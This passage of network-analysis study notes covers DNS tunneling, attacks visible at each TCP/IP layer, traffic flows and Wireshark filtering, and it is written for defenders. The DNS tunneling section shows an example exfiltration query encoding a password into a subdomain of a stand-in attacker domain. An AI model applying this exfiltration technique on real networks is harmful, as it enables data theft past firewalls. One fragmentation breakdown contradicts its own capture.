| **Traffic Type**    | Small lookup request                         | Large data transfer                                      |
| **Analogy**         | Looking up a store's address in a phone book | Visiting the store and buying something                  |


---


# DNS Tunneling


**DNS Tunneling** is an attack technique where attackers **hide malicious data inside DNS queries** to bypass firewalls and communicate with a Command & Control (C2) server.


---


## Why It Works


Most organizations:

- ❌ Block unauthorized HTTP/HTTPS traffic.
- ✅ Allow DNS (Port 53) because devices need DNS to access websites.

Attackers abuse this trusted DNS traffic to steal data.


---


## How DNS Tunneling Works


```plain text
DNS Query
[ Infected Laptop ] ----------------------------► [ Firewall ]
      │                                              │
      │                                              │ Allows DNS (Port 53)
      │                                              ▼
      └────────────────────────────────────────► [ Attacker DNS/C2 Server ]
                                                   │
                                                   ▼
                                         Extracts Stolen Data
```


### Step 1 – Setup


The attacker registers a malicious domain:


```plain text
hacker-server.com
```


and configures it as an authoritative DNS server.


### Step 2 – Data Exfiltration


Instead of sending data through HTTP, malware encodes stolen information inside a DNS query.


Example:


```plain text
mysecretpassword.hacker-server.com
```


### Step 3 – Firewall Bypass


The firewall sees:


```plain text
DNS Query (Port 53)
```


and allows it because DNS traffic is normally trusted.


### Step 4 – Data Extraction


The attacker's DNS server receives:


```plain text
mysecretpassword.hacker-server.com
```


extracts:


```plain text
mysecretpassword
```


and reconstructs the stolen data.


### Step 5 – Command Execution


The attacker can respond using:

- **TXT Record**
- **CNAME Record**

to send encrypted commands back to the malware.


---


# How to Detect DNS Tunneling


Look for unusual DNS activity such as:

- Extremely long subdomains

    ```plain text
    verylongencodedstring.attacker.com
    ```

- Large numbers of **TXT** or **CNAME** queries from one internal IP.
- Many DNS requests to unknown or randomly generated domains.

---


## Key Points

- **DNS** translates a domain name into an IP address.
- **HTTP/HTTPS** downloads the website content.
- **DNS Tunneling** abuses DNS (Port 53) to bypass firewalls.
- Attackers use DNS queries to **exfiltrate data** and **receive C2 commands**.
- Indicators include **long subdomains**, **excessive TXT/CNAME queries**, and **high DNS request volumes** to suspicious domains.

# TCP/IP Model


The best way to showcase the traffic we can observe in the network is by using the architecture implemented in nearly every device with a network interface: the TCP/IP stack. The image below shows the different layers of the TCP/IP model. Each layer describes the required information (headers) to pass the data to the next layer. The information included in each header, together with the application data, is precisely what we want to observe. Logs often include bits and pieces of these headers, but never the full packet details. This is why we need to do network traffic analysis.


![Image](images/3ec26b0019b195ba64f83c232e660db5.png)


## **Application layer**


On the application layer, we can find two important information structures: the application header information and the application data itself (payload). This information will change depending on which application layer protocol is used. Let's look at an example of HTTP.


The code snippets below show the application headers of a client sending a GET request and the server's response. Most web proxies and firewalls log this header data. What they don't log is the application data or payload. From the GET request, you can determine that the client is requesting a file named `suspicious_package.zip`. The server's response includes a 200 code, which means the request was accepted. However, what you can't see in the logs is the content of the ZIP file (highlighted in yellow).


_Request_


```json
GET /downloads/suspicious_package.zip HTTP/1.1
Host: www.tryhackrne.thn
User-Agent: curl/7.85.0
Accept: */*
Connection: close
```


_Response_


```json
HTTP/1.1 200 OK
Date: Mon, 29 Sep 2025 10:15:30 GMT
Server: nginx/1.18.0
Content-Type: application/zip
Content-Length: 10485760
Content-Disposition: attachment; filename="suspicious_package.zip"
Last-Modified: Mon, 29 Sep 2025 09:54:00 GMT
ETag: "5d8c72-9f8a1c-3a2b4c"
Accept-Ranges: bytes
Connection: close

[binary ZIP file bytes follow — 10,485,760 bytes]
```


## Transport Layer


At the **Transport Layer**, application data is **segmented into smaller pieces**. Each segment is encapsulated with a **Transport Header**, which is typically either **TCP** or **UDP**.


### Firewall Logs


Example:


```plain text
2025-10-13 09:15:32 ACCEPT TCP src=192.168.1.45 dst=172.217.22.14 sport=51432 dport=443 flags=SYN len=60
2025-10-13 09:15:32 ACCEPT TCP src=172.217.22.14 dst=192.168.1.45 sport=443 dport=51432 flags=SYN,ACK len=60
```


A firewall log typically records:

- Source IP & Destination IP
- Source Port & Destination Port
- TCP Flags (SYN, ACK, etc.)
- Packet Length
- Allow/Deny action
> **Limitation:** Firewall logs usually **do not include all TCP header fields**, such as **Sequence Numbers**.

---


### Why is this important?


Some attacks rely on fields that are **not visible in firewall logs**.


One example is **TCP Session Hijacking**, where an attacker attempts to inject packets into an already established TCP session.


To detect this, analysts need **packet-level inspection (e.g., Wireshark)** because it shows the complete TCP header, including **Sequence Numbers**.


---


### Wireshark Capture


```plain text
1  192.168.1.45 → 172.217.22.14  [SYN]      Seq=0
2  172.217.22.14 → 192.168.1.45  [SYN, ACK] Seq=0 Ack=1
3  192.168.1.45 → 172.217.22.14  [ACK]      Seq=1 Ack=1
4  192.168.1.45 → 172.217.22.14  [PSH, ACK] Seq=1 Ack=1
5  172.217.22.14 → 192.168.1.45  [ACK]      Seq=1 Ack=1461
6  192.168.99.200 → 172.217.22.14 [PSH, ACK] Seq=34567232 Ack=1
```


### Breakdown

- **Packets 1–3:** Normal TCP **3-way handshake** (`SYN → SYN,ACK → ACK`).
- **Packets 4–5:** Legitimate data transfer between the client and server.
- **Packet 6:** A different source (`192.168.99.200`) attempts to inject itself into the existing session. Notice the **huge jump in the Sequence Number (****`Seq=34567232`****)**, which is abnormal and indicates a possible **Session Hijacking** attempt.

## Internet Layer 


After the **Transport Layer** creates the TCP/UDP segment, it is passed to the **Internet Layer**, where an **IP Header** is added. If the packet size exceeds the **Maximum Transmission Unit (MTU)**, it is **fragmented** into smaller IP packets, each with its own IP header.


---


### What Firewall Logs Show


Firewall logs typically record:

- Source IP
- Destination IP
- TTL (Time To Live)

For most network traffic, this information is sufficient to identify **who is communicating with whom**.

> **Limitation:** Firewall logs usually **do not include fragmentation details** such as the **Fragment Offset** and **Total Length**.

---


### Why is this Important?


Some attacks specifically abuse **IP fragmentation**.


For example, an attacker can:

- Create **very small fragments** (Tiny Fragment Attack) to bypass IDS inspection.
- Create **overlapping fragments** so different systems reconstruct the packet differently.

These attacks **cannot be detected from firewall logs alone** because the required fragmentation fields are missing.


---


### Wireshark Capture


```plain text
1 203.0.113.45 → 192.168.1.10 UDP [MF] Offset=0    Len=1480
2 203.0.113.45 → 192.168.1.10 UDP [MF] Offset=1480 Len=1480
3 203.0.113.45 → 192.168.1.10 UDP      Offset=1480 Len=64   ← Overlap
4 192.168.1.10 → 203.0.113.45 ICMP Destination Unreachable
```


### Breakdown

- **Packets 1 & 2:** Normal fragmentation of a large packet into multiple fragments.
- **Packet 3:** Uses the **same Fragment Offset (1480)** as Packet 2, causing the fragments to **overlap**.
- Because of the overlap, different systems may **reassemble the packet differently**, allowing attackers to hide malicious payloads or evade an IDS.
- **Packet 4:** The destination cannot correctly reassemble the fragments and returns an **ICMP "Fragment reassembly time exceeded"** message.

## Link Layer 


After the **Internet Layer** adds the IP header, the packet is passed to the **Link Layer**, where another header is added containing **MAC (Physical) Addresses** for communication within the local network.


---


### What Firewall Logs Show


Firewall logs usually record:

- Source MAC Address
- Destination MAC Address

For normal traffic, this is enough to identify which devices are communicating on the local network.

> **Limitation:** Firewall logs do not show the **ARP conversation** between devices. They cannot reveal if MAC addresses are being fraudulently advertised.

---


### Why is this Important?


One common attack at the Link Layer is **ARP Poisoning (ARP Spoofing).**


### Example Scenario


Suppose:

- Router: **192.168.1.1**
- Victim: **192.168.1.10**
- Attacker: **192.168.1.200**

Normally, when the victim wants to communicate with the router, it asks:

> **"Who has 192.168.1.1?"**

The router replies:

> **"192.168.1.1 is at MAC 00:11:22:33:44:55."**

The victim stores this mapping in its ARP cache.


The attacker then sends **fake ARP replies** saying:

> **"192.168.1.1 is at MAC aa:bb:cc:dd:ee:ff."**

Since ARP has **no authentication**, the victim trusts the fake reply and updates its ARP cache.


From this point onward, the victim unknowingly sends all traffic to the **attacker's MAC address** instead of the real router.


The attacker can:

- Read the traffic (Man-in-the-Middle).
- Modify the traffic.
- Forward it to the real router so the victim doesn't notice.

---


### Packet Capture (Wireshark)


```plain text
1 192.168.1.1   → Broadcast      ARP  Who has 192.168.1.10?
2 192.168.1.10  → 192.168.1.1    ARP  192.168.1.10 is at 00:11:22:33:44:55
3 192.168.1.200 → 192.168.1.1    ARP  192.168.1.10 is at aa:bb:cc:dd:ee:ff   ← Fake Reply
4 192.168.1.200 → 192.168.1.10   ARP  192.168.1.1 is at aa:bb:cc:dd:ee:ff    ← Fake Reply
5 192.168.1.10  → 172.217.22.14  TCP  SYN
6 192.168.1.200 → 172.217.22.14  TCP  SYN                                 ← Traffic now relayed by attacker
```


### Breakdown

- **Packets 1–2:** Normal ARP request and reply.
- **Packets 3–4:** The attacker sends **spoofed ARP replies**, falsely claiming to own both IP addresses.
- **Packets 5–6:** The victim's traffic is now routed **through the attacker**, allowing them to intercept or modify communications before forwarding them to the real destination.

# Sources of Network Traffic


Network traffic generally comes from **two sources**:

1. **Intermediary Devices** (Network Infrastructure)
2. **Endpoint Devices** (End Users / Hosts)

---


## 1. Intermediary Sources


These are **network devices through which traffic passes**. Their main job is to **forward, filter, inspect, or manage** network traffic rather than generate user data.


### Examples

- Firewall
- Router
- Switch
- IDS / IPS
- Web Proxy
- Access Point (AP)
- Wireless LAN Controller (WLC)

### Traffic Generated


These devices mainly generate **management and network control traffic**, such as:

- **ARP** – Resolve IP ↔ MAC addresses
- **DHCP** – Assign IP addresses
- **SNMP** – Device monitoring
- **Syslog** – Log messages
- **ICMP (Ping)** – Connectivity testing
- **OSPF, EIGRP, BGP** – Routing protocols

### Simple Scenario


```plain text
Laptop ───► Firewall ───► Router ───► Internet
```


Here,

- The **Laptop** generates the web traffic.
- The **Firewall** only inspects and forwards it.
- The **Router** only routes it.

The firewall and router generate very little traffic themselves (mainly logs and routing updates).


---


## 2. Endpoint Sources


These are the **devices where communication starts and ends**. They generate the majority of network traffic.


### Examples

- Desktop / Laptop
- Server
- Mobile Phone
- IoT Device
- Printer
- Cloud VM
- Lab Machine

### Traffic Generated


Examples include:

- Browsing websites
- Sending emails
- Downloading files
- Video streaming
- File sharing
- Database access

### Simple Scenario


```plain text
Laptop ─────────► Google Server
```


The **Laptop** sends the request.


The **Google Server** sends the response.


Both are **Endpoints** because the communication starts at one endpoint and ends at another.


---


# Network Traffic Flows


A **network flow** is the path that network traffic takes between devices or networks. In a corporate environment, traffic is generally classified into:

- **North-South (NS) Traffic**
- **East-West (EW) Traffic**

---


## 1. North-South (NS) Traffic


**North-South traffic** is communication **between the internal network (LAN) and the external network (Internet/WAN).**


```plain text
Internet (WAN)
      ▲
      │
   Firewall
      │
      ▼
Corporate Network (LAN)
```


Since all traffic enters or leaves the organization through the firewall, **North-South traffic is usually well monitored.**


### Common Services

- HTTPS (Web Browsing)
- DNS
- SSH
- VPN
- SMTP (Email)
- RDP

### Traffic Direction

- **Ingress (Inbound)** → Internet → LAN
- **Egress (Outbound)** → LAN → Internet

### Example


An employee opens [**www.google.com**](http://www.google.com/).


```plain text
Laptop ───► Firewall ───► Internet (Google)
```


This is **North-South traffic** because it crosses the organization's boundary.


---


## 2. East-West (EW) Traffic


**East-West traffic** is communication **between devices inside the same corporate network (LAN).**


```plain text
PC1 ─────► File Server
 │
 ├──────► Domain Controller
 │
 └──────► Database Server
```


Since this traffic **does not pass through the firewall**, it is often **less monitored**.


---


## Why is East-West Traffic Important?


If an attacker compromises one computer, they usually **do not immediately attack the Internet**.


Instead, they first **move laterally** inside the network to compromise other systems.


### Example


An attacker compromises **Employee-PC**.


Instead of attacking outside:


```plain text
Employee-PC
      │
      ├──► File Server
      ├──► Domain Controller
      └──► Database Server
```


The attacker tries to access multiple internal systems to steal data or gain higher privileges. This is called **Lateral Movement**.


---


## Common East-West Services


### Directory & Authentication

- Kerberos
- LDAP
- RADIUS
- TACACS+
- Certificate Authority (CA)

### File & Print Services

- SMB/CIFS
- IPP
- LPD

### Infrastructure Services

- DHCP
- ARP
- Internal DNS
- Routing Protocols

### Application Communication

- SQL Database Connections
- REST APIs
- gRPC

### Backup & Replication

- File Replication
- Database Replication

### Monitoring & Management

- SNMP
- Syslog
- NetFlow/IPFIX
- Endpoint Logs

## **Flow Examples**


Let's have a visual look at some of the network flows mentioned above.


### HTTPS Network Flow (TLS Inspection)


When a user opens a website, the request first goes to the **Next-Generation Firewall (NGFW)**, which contains a **Web Proxy**.


```plain text
Client
   │
   ▼
NGFW / Web Proxy
   │
   ▼
Web Server
```


### Flow


![Image](images/f1410df345b2f64ab3b75018a63b48e6.png)

1. The **Client** requests a website.
2. The request reaches the **NGFW/Web Proxy**.
3. The **Web Proxy** creates a **new TCP session** with the actual Web Server.
4. The Web Server sends the response back to the **Web Proxy**.
5. The **Web Proxy inspects the content**.
6. If the content is safe, it forwards the response to the **Client**.

### Important Point


Two separate TCP sessions are created:

- **Client ↔ Web Proxy**
- **Web Proxy ↔ Web Server**

Although the client believes it is communicating directly with the web server, the proxy sits in the middle to inspect HTTPS traffic.


### 2. External DNS Network Flow


When a user enters a domain name, the DNS request follows this path.


```plain text
Host
   │
   ▼
Internal DNS Server
   │
(Cache Check)
   │
   ▼
Router
   │
   ▼
Firewall
   │
   ▼
External DNS Server
```


### Flow


![Image](images/5c701abf3d214a73dc1497aa8da40de4.png)

1. The **Host** sends a DNS query to the **Internal DNS Server** (Port 53).
2. The Internal DNS Server checks whether the answer already exists in its **cache**.
3. If found, it immediately replies to the Host.
4. If not found, the query is forwarded through the **Router** and **Firewall** to the **External DNS Server**.
5. The External DNS Server returns the answer.
6. The Internal DNS Server forwards the answer back to the Host.

### Important Point


The **Internal DNS Server acts on behalf of the Host**, so hosts do not directly query external DNS servers.


### 3. SMB with Kerberos Flow


![Image](images/9f76e53b8f702644f71b50281a893b8f.png)


When a user accesses a shared folder (e.g., `\\FILESERVER\MARKETING`), authentication happens before the SMB connection is established.


```plain text
Host
   │
   ▼
Domain Controller (KDC)
   │
(Service Ticket)
   ▼
File Server
```


### Flow

1. The user logs into the **Host**.
2. The Host authenticates with the **Domain Controller (Key Distribution Center - KDC)**.
3. The KDC issues a **Ticket Granting Ticket (TGT)**.
4. When the user accesses `\\FILESERVER\MARKETING`, the Host uses the **TGT** to request a **Service Ticket**.
5. The KDC issues the Service Ticket.
6. The Host uses the Service Ticket to establish the **SMB session** with the File Server.
7. The user can now access the shared folder.

### Important Point


The **SMB connection is established only after Kerberos authentication is successful**, ensuring that only authenticated users can access network shares.


# Wireshark


## Wireshark Packet Filtering


Wireshark provides different filtering options to help analysts focus on the traffic of interest.


---


### 1. Apply as Filter


**Purpose:** Filters packets based on a selected field or value.


Example


Suppose you click on the IP address:


```plain text
192.168.1.10
```


Choose:


```plain text
Right Click → Apply as Filter → Selected
```


Wireshark automatically creates:


```plain text
ip.addr == 192.168.1.10
```


Now, only packets involving **192.168.1.10** are displayed.


### Use Case


During an investigation, you identify a suspicious IP address and want to see **only its traffic** instead of thousands of unrelated packets.


---


### 2. Conversation Filter


**Purpose:** Shows **all packets exchanged between two devices**.


Unlike **Apply as Filter**, which filters a single field, **Conversation Filter** follows the **entire communication**.


### Example


Suppose packet 150 contains:


```plain text
192.168.1.10:51523  →  8.8.8.8:443
```


Choose:


```plain text
Right Click → Conversation Filter → TCP
```


Wireshark displays:


```plain text
192.168.1.10  ⇄  8.8.8.8
```


Only packets belonging to **this TCP session** remain visible.


### Use Case


You're investigating whether a victim successfully downloaded malware from a server.


Instead of viewing every packet in the capture, you view **only the conversation** between the victim and that server.


---


### Apply as Filter vs Conversation Filter


Suppose your PC communicates with Google, Microsoft, and GitHub.


```plain text
Your PC
 ├──► Google
 ├──► Microsoft
 └──► GitHub
```


### Apply as Filter


```plain text
ip.addr == YourPC
```


Shows **all traffic** involving your PC.


```plain text
YourPC ⇄ Google
YourPC ⇄ Microsoft
YourPC ⇄ GitHub
```


### Conversation Filter


Applied on the Google packet:


```plain text
YourPC ⇄ Google
```


Only the communication between **Your PC and Google** is shown.


---


## 3. Colourise Conversation


**Purpose:** Highlights a conversation **without hiding other packets**.


Instead of filtering, Wireshark simply colors the packets.


### Example


Imagine a capture containing:


```plain text
Google
Microsoft
GitHub
DNS
ARP
DHCP
```


After **Colourise Conversation** on the Google traffic:


```plain text
🟨 Google packets
Normal Microsoft packets
Normal DNS packets
Normal ARP packets
```


Everything remains visible, but the selected conversation is easy to follow.


### Use Case


You want to compare one connection with the rest of the network traffic without removing anything.


---


## 4. Prepare as Filter


**Purpose:** Creates a filter **but does not apply it immediately.**


### Example


You right-click:


```plain text
192.168.1.10
```


Choose:


```plain text
Prepare as Filter
```


Wireshark writes:


```plain text
ip.addr == 192.168.1.10
```


into the filter bar **without executing it**.


You can now edit it:


```plain text
ip.addr == 192.168.1.10 && tcp.port == 443
```


Then press **Enter**.


### Use Case


Useful when building **complex filters** before running them.


---


## 5. Apply as Column


**Purpose:** Adds a selected field as a **new column** in the packet list.


### Example


Normally Wireshark shows:


| No | Source       | Destination | Protocol |
| -- | ------------ | ----------- | -------- |
| 1  | 192.168.1.10 | 8.8.8.8     | TCP      |
| 2  | 192.168.1.20 | 1.1.1.1     | TCP      |


Suppose you right-click:


```plain text
HTTP Host
```


and choose:


```plain text
Apply as Column
```


Now Wireshark shows:


| No | Source       | Destination | Protocol | HTTP Host  |
| -- | ------------ | ----------- | -------- | ---------- |
| 1  | 192.168.1.10 | 8.8.8.8     | TCP      | google.com |
| 2  | 192.168.1.20 | 1.1.1.1     | TCP      | github.com |


### Use Case


Suppose you're investigating **1000 HTTP requests**.


Instead of opening every packet to see the website, you can immediately see the **Host** column for every packet.


Other useful columns include:

- HTTP Host
- TLS Server Name (SNI)
- TCP Stream Number
- DNS Query
- User-Agent

This makes patterns much easier to spot.


---


## 6. Follow Stream


**Purpose:** Reconstructs an entire conversation exactly as the application saw it.


Packets are transmitted in small pieces.


For example:


```plain text
Packet 10 → "Hello"
Packet 11 → " World"
Packet 12 → "!"
```


Individually, they don't make much sense.


Choosing:


```plain text
Follow TCP Stream
```


shows:


```plain text
Hello World!
```


as one continuous conversation.


### Example (HTTP Login)


Suppose someone logs into a website.


Instead of seeing dozens of TCP packets:


```plain text
Packet 20
Packet 21
Packet 22
Packet 23
...
```


Follow Stream reconstructs:


```plain text
POST /login HTTP/1.1

Username=alice
Password=P@ss123
```


(if the traffic is **unencrypted**, such as HTTP).


### Use Case


A SOC analyst suspects credentials were sent over HTTP.


Rather than reading hundreds of packets one by one, they use **Follow TCP Stream** to reconstruct the full request and quickly identify usernames, passwords, cookies, commands, or downloaded content.

> **Note:** If the traffic is **HTTPS (encrypted)**, Follow Stream still reconstructs the conversation, but the payload will remain encrypted unless it can be decrypted.

# Wireshark Statistics


The **Statistics** menu provides an overview of the captured traffic. Instead of inspecting packets one by one, analysts can use these statistics to understand the **overall network activity**, identify protocols, endpoints, conversations, and create an initial hypothesis before deeper investigation.


## Resolved Addresses


**Path:** `Statistics → Resolved Addresses`


### What it Shows

- Lists all **resolved IP addresses and their hostnames** found in the capture.
- The hostname information is obtained from **DNS responses** in the PCAP.

### Why is it Useful?


Instead of seeing:


```plain text
142.250.183.14
```


You may see:


```plain text
google.com
```


This helps analysts quickly identify **which websites or servers were accessed** during the capture.


---


## Protocol Hierarchy


**Path:** `Statistics → Protocol Hierarchy`


### What it Shows


Displays all protocols present in the capture in a **tree view**, along with:

- Packet Count
- Percentage of Total Traffic
- Bytes Transferred

Example:


```plain text
Frame
 ├── Ethernet
 │    ├── IPv4
 │         ├── TCP
 │         │     ├── HTTP
 │         │     └── HTTPS
 │         └── UDP
 │               └── DNS
```


### Why is it Useful?

- Identify the most used protocols.
- Understand the overall traffic distribution.
- Quickly determine which protocol should be investigated.
> **Tip:** You can right-click any protocol and apply it as a display filter.

---


## Conversations


**Path:** `Statistics → Conversations`


### What it Shows


A **Conversation** represents communication between **two endpoints**.


Wireshark organizes conversations into five categories:

- Ethernet
- IPv4
- IPv6
- TCP
- UDP

Each conversation includes information such as:

- Source
- Destination
- Packets
- Bytes
- Duration

Example:


```plain text
192.168.1.10  ⇄  8.8.8.8
```


### Why is it Useful?

- Identify **who communicated with whom**.
- Find the most active connections.
- Investigate suspicious communications between specific devices.

---


## Endpoints


**Path:** `Statistics → Endpoints`


### What it Shows


Lists all **unique devices (endpoints)** found in the capture.


The information is grouped into five categories:

- **Ethernet** → Unique MAC Addresses
- **IPv4** → Unique IPv4 Addresses
- **IPv6** → Unique IPv6 Addresses
- **TCP** → TCP Endpoints (IP + TCP Port)
- **UDP** → UDP Endpoints (IP + UDP Port)

Unlike **Conversations**, which show communication **between two devices**, **Endpoints** list each device **individually**.


Example:


```plain text
IPv4 Endpoints

192.168.1.10
192.168.1.20
8.8.8.8
```


### Why is it Useful?

- Identify every host involved in the capture.
- Detect unknown or suspicious devices.
- Find all IP or MAC addresses participating in network communication.

---


## Name Resolution


**Path:** `Edit → Preferences → Name Resolution`


![Image](images/ea8ca547b9678ee5e2d3cfd0331f9c48.png)


### What it Does


Converts technical values into **human-readable names**.


Supported resolutions include:

- MAC Address → Manufacturer
- IP Address → Hostname
- Port Number → Service Name

Examples:


```plain text
00:50:56:xx:xx:xx
        ↓
VMware
```


```plain text
142.250.183.14
        ↓
google.com
```


```plain text
443
 ↓
HTTPS
```


### Why is it Useful?


Makes packet analysis much easier by displaying **meaningful names** instead of raw addresses or numbers.


---


## GeoIP


**Path:** `Edit → Preferences → Name Resolution → MaxMind Database`
**Check :** Statistics → Endpoints


![Image](images/335f220774d04f6708e8221f00d306f4.png)


### What it Does


Uses the **MaxMind GeoIP database** to map IP addresses to their **geographical locations**.


Example:


```plain text
8.8.8.8
 ↓
United States
```


### Requirements

- MaxMind GeoIP Database
- Database path configured in Wireshark
- Internet connection (for map view)

### Why is it Useful?


Helps analysts determine **where external IP addresses are located**, which is useful during incident investigations.


## IPv4 and IPv6 Statistics


**Path:** `Statistics → IPv4 Statistics` or `Statistics → IPv6 Statistics`


### What it Shows


Provides statistics **only for the selected IP version** (IPv4 or IPv6).


This helps analysts isolate traffic related to a specific IP version instead of viewing both together.


### Why is it Useful?

- View only IPv4 or only IPv6 traffic.
- Identify events related to a specific IP version.
- Simplify investigations in dual-stack (IPv4 + IPv6) networks.

---


## DNS Statistics


**Path:** `Statistics → DNS`


### What it Shows


Displays all **DNS packets** in a **tree view** along with packet counts and percentages.


It provides DNS statistics such as:

- RCODE (Response Code)
- OPCODE (Operation Code)
- Class
- Query Type (A, AAAA, MX, TXT, etc.)
- Service Statistics
- Query Statistics

### Why is it Useful?

- Understand overall DNS activity.
- Identify the most common DNS query types.
- Detect DNS errors (e.g., NXDOMAIN, SERVFAIL).
- Spot unusual DNS behavior that may indicate suspicious activity.

---


## HTTP Statistics


**Path:** `Statistics → HTTP`


### What it Shows


Displays all **HTTP packets** in a **tree view** along with packet counts and percentages.


It includes:

- HTTP Request Methods (GET, POST, etc.)
- HTTP Response Status Codes (200, 404, 500, etc.)
- Original HTTP Requests

### Why is it Useful?

- Analyze overall HTTP traffic.
- Identify frequently accessed web resources.
- Detect failed requests (404, 500) or suspicious HTTP activity.
- Review client requests and server responses during an investigation.

# Packet Filtering


Packet filtering helps analysts focus on the packets relevant to an investigation by reducing unnecessary traffic.


Wireshark supports **two types of filters**:


| Capture Filter                           | Display Filter                                                 |
| ---------------------------------------- | -------------------------------------------------------------- |
| Applied **before** packet capture starts | Applied **after** packets are captured                         |
| Saves only matching traffic              | Shows only matching packets while keeping all captured packets |
| Cannot be changed during capture         | Can be changed anytime during analysis                         |
| Used for packet collection               | Used for packet investigation                                  |

> **Note:** Capture filters and Display filters use **different syntax** and **cannot be used interchangeably**.

### Best Practice


The common approach is:

1. Capture **all network traffic**.
2. Apply **Display Filters** to investigate the event of interest.

Capture Filters should only be used when you are certain about the traffic you want to capture. Otherwise, important packets may never be captured.


---


## Capture Filter Syntax


Capture filters use a simpler syntax and are configured **before capturing traffic**.


### Basic Components

- **Scope:** `host`, `net`, `port`, `portrange`
- **Direction:** `src`, `dst`, `src or dst`, `src and dst`
- **Protocol:** `ether`, `wlan`, `ip`, `ip6`, `arp`, `rarp`, `tcp`, `udp`

### Example


Capture only HTTP traffic (Port 80):


```plain text
tcp port 80
```


---


## Display Filter Syntax


Display filters are used **after packets are captured**.


They support over **3000 protocols**, making them much more powerful for packet analysis.


### Example


Display only HTTP traffic (Port 80):


```plain text
tcp.port == 80
```


---


## Comparison Operators


Comparison operators are used to match specific values.


| Operator  | Meaning               | Example                  |
| --------- | --------------------- | ------------------------ |
| `==` (eq) | Equal                 | `ip.src == 10.10.10.100` |
| `!=` (ne) | Not Equal             | `ip.src != 10.10.10.100` |
| `>` (gt)  | Greater Than          | `ip.ttl > 250`           |
| `<` (lt)  | Less Than             | `ip.ttl < 10`            |
| `>=` (ge) | Greater Than or Equal | `ip.ttl >= 0xFA`         |
| `<=` (le) | Less Than or Equal    | `ip.ttl <= 0xA`          |

> **Note:** Wireshark accepts both **decimal** and **hexadecimal** values in display filters.

---


## Logical Operators


Logical operators allow combining multiple conditions.


| Operator   | Meaning                      | Example                                                |
| ---------- | ---------------------------- | ------------------------------------------------------ |
| `&&` (AND) | Both conditions must be true | `(ip.src == 10.10.10.100) && (tcp.port == 80)`         |
| `||` (OR)  | Either condition can be true | `(ip.src == 10.10.10.100) || (ip.src == 10.10.10.111)` |
| `!` (NOT)  | Excludes matching traffic    | `!(ip.src == 10.10.10.222)`                            |


### Example


Show only HTTP traffic from a specific host:


```plain text
(ip.src == 192.168.1.10) && (tcp.port == 80)
```


Show traffic from either of two hosts:


```plain text
(ip.src == 192.168.1.10) || (ip.src == 192.168.1.20)
```


Exclude traffic from a host:


```plain text
!(ip.src == 192.168.1.100)
```

> **Recommended:** Instead of using `!=`, Wireshark recommends using the **NOT (****`!`****)** operator for more consistent filtering results.

# Protocol Filters


Protocol filters allow analysts to investigate packets based on specific protocol fields. Wireshark supports **3000+ protocols**, enabling packet-level filtering from the **Network, Transport, and Application layers**.


---


## IP Filters (Network Layer)


IP filters are used to investigate **IP addresses, IP version, TTL, fragmentation, flags, checksum, and other IP header fields**.


| Filter                                           | Description                                                       |
| ------------------------------------------------ | ----------------------------------------------------------------- |
| `ip`                                             | Show all IPv4 packets                                             |
| `ipv6`                                           | Show all IPv6 packets                                             |
| `ip.addr == 10.10.10.111`                        | Show packets where the IP appears as either source or destination |
| `ip.addr == 10.10.10.0/24`                       | Show packets from the entire subnet                               |
| `ip.src == 10.10.10.111`                         | Show packets originating from the IP                              |
| `ip.dst == 10.10.10.111`                         | Show packets sent to the IP                                       |
| `ip.version == 4`                                | Show IPv4 packets                                                 |
| `ip.version == 6`                                | Show IPv6 packets                                                 |
| `ip.ttl < 10`                                    | Show packets with low TTL                                         |
| `ip.ttl > 200`                                   | Show packets with high TTL                                        |
| `ip.flags.df == 1`                               | Don't Fragment (DF) flag set                                      |
| `ip.flags.mf == 1`                               | More Fragments (MF) flag set                                      |
| `ip.frag_offset > 0`                             | Show fragmented packets                                           |
| `ip.len > 1000`                                  | Packets larger than 1000 bytes                                    |
| `ip.checksum_bad == 1 ip.checksum.status == bad` | Invalid IP checksum                                               |

> **Note:** `ip.addr` ignores packet direction, while `ip.src` and `ip.dst` filter based on source or destination.

---


## TCP Filters (Transport Layer)


TCP filters investigate **ports, sequence numbers, acknowledgements, flags, windows, retransmissions, resets, and errors**.


| Filter                        | Description                      |
| ----------------------------- | -------------------------------- |
| `tcp`                         | Show all TCP packets             |
| `tcp.port == 80`              | TCP packets using port 80 (HTTP) |
| `tcp.port == 443`             | HTTPS traffic                    |
| `tcp.port == 22`              | SSH traffic                      |
| `tcp.port == 21`              | FTP traffic                      |
| `tcp.port == 25`              | SMTP traffic                     |
| `tcp.port == 3389`            | RDP traffic                      |
| `tcp.srcport == 1234`         | Source port 1234                 |
| `tcp.dstport == 80`           | Destination port 80              |
| `tcp.flags.syn == 1`          | SYN packets                      |
| `tcp.flags.ack == 1`          | ACK packets                      |
| `tcp.flags.fin == 1`          | FIN packets                      |
| `tcp.flags.reset == 1`        | RST packets                      |
| `tcp.flags.push == 1`         | PSH packets                      |
| `tcp.flags.urg == 1`          | URG packets                      |
| `tcp.seq == 1000`             | Sequence number 1000             |
| `tcp.ack == 2000`             | Acknowledgement number 2000      |
| `tcp.analysis.retransmission` | TCP retransmissions              |
| `tcp.analysis.lost_segment`   | Lost TCP segments                |
| `tcp.analysis.duplicate_ack`  | Duplicate ACK packets            |
| `tcp.window_size > 0`         | TCP window size                  |


---


## UDP Filters (Transport Layer)


UDP filters investigate **connectionless traffic and UDP-based services**.


| Filter              | Description          |
| ------------------- | -------------------- |
| `udp`               | Show all UDP packets |
| `udp.port == 53`    | DNS                  |
| `udp.port == 69`    | TFTP                 |
| `udp.port == 123`   | NTP                  |
| `udp.port == 161`   | SNMP                 |
| `udp.port == 162`   | SNMP Trap            |
| `udp.port == 514`   | Syslog               |
| `udp.port == 5353`  | mDNS                 |
| `udp.srcport == 53` | DNS responses        |
| `udp.dstport == 53` | DNS requests         |
| `udp.length > 500`  | Large UDP packets    |


---


## HTTP Filters (Application Layer)


HTTP filters analyze **web requests, responses, methods, headers, and status codes**.


| Filter                            | Description           |
| --------------------------------- | --------------------- |
| `http`                            | Show all HTTP packets |
| `http.request`                    | HTTP requests         |
| `http.response`                   | HTTP responses        |
| `http.request.method == "GET"`    | GET requests          |
| `http.request.method == "POST"`   | POST requests         |
| `http.request.method == "PUT"`    | PUT requests          |
| `http.request.method == "DELETE"` | DELETE requests       |
| `http.response.code == 200`       | Successful responses  |
| `http.response.code == 301`       | Redirects             |
| `http.response.code == 302`       | Temporary redirects   |
| `http.response.code == 404`       | Page not found        |
| `http.response.code == 500`       | Internal Server Error |
| `http.host == "example.com"`      | Specific website      |
| `http.user_agent`                 | User-Agent header     |
| `http.request.uri`                | Requested URI         |


---


## DNS Filters (Application Layer)


DNS filters investigate **queries, responses, record types, response codes, and transaction IDs**.


